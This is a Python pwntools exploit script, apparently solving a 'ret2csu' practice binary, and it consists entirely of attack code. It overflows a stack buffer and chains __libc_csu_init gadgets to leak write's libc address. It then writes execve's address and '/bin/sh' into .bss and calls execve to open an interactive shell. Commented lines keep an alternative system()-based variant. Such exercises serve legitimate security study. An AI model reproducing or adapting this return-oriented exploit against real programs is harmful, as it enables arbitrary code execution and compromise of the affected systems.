from pwn import *

elf = ELF('ret2csu')
p = process('./ret2csu')

write_got = elf.got['write']
print ("write_got: " + hex(write_got))
read_got = elf.got['read']
print ("read_got: " + hex(read_got))
main_addr = elf.symbols['main']
print ("main_addr: " + hex(main_addr))
bss_base = elf.bss()
print ("bss_base: " + hex(bss_base))

csu_front_addr = 0x4005F0
csu_end_addr = 0x400606
offset = 0x80
fakeebp = b'b' * 8

payload1 = b'a' * (offset + 0x8)
#payload1 = b'a' * offset
payload1 += p64(csu_end_addr) + fakeebp + p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got) + p64(8)
# pop_junk_rbx_rbp_r12_r13_r14_r15_ret
# (rbx,rbp,r12,r13,r14,r15,ret,offset) ->(0,1,write_got,1,write_got,8,main_addr,offset)
payload1 +=p64(csu_front_addr)
payload1 += b"c" * (0x38)
payload1 += p64(main_addr)
p.recvuntil(b"Hello, World\n")
print ("\n#############sending payload1#############\n")
p.send(payload1)
sleep(1)


write_addr = u64(p.recv(8))
print ("write_addr: " + hex(write_addr))

libc=ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
libc_base = write_addr - libc.symbols['write']
print ("libc_base: " + hex(libc_base))
execve_addr = libc_base + libc.symbols['execve']

#write_libc = 0x114a20
#read_libc = 0x114980
#system_libc = 0x050d60
#binsh_addr = 0x1d8698

#libc_offset = write_addr - write_libc
#print ("libc_offset: " + hex(libc_offset))
#system_addr = libc_offset + system_libc
#print ("system_addr: " + hex(system_addr))

p.recvuntil(b"Hello, World\n")
payload2 = b'a' * (offset + 0x8)
payload2 += p64(csu_end_addr) + fakeebp + p64(0) + p64(1) + p64(read_got) + p64(0) + p64(bss_base) + p64(16)
payload2 += p64(csu_front_addr)
payload2 += b"c" * (0x38)
payload2 += p64(main_addr)
print ("\n#############sending payload2#############\n")
p.send(payload2)
sleep(1)

p.send(p64(execve_addr) + b'/bin/sh\x00')
#p.send(p64(system_addr))
#p.send(b"/bin/sh\00")
sleep(1)


p.recvuntil(b"Hello, World\n")
payload3 = b'a' * (offset + 0x8)
#payload3 = b'a' * offset
payload3 += p64(csu_end_addr) + fakeebp + p64(0) + p64(1) + p64(bss_base) + p64(bss_base+8) + p64(0) + p64(0)
payload3 += p64(csu_front_addr)
payload3 += b"c" * (0x38)
payload3 += p64(main_addr)

print ("\n#############sending payload3#############\n")
sleep(1)

p.send(payload3)
p.interactive()
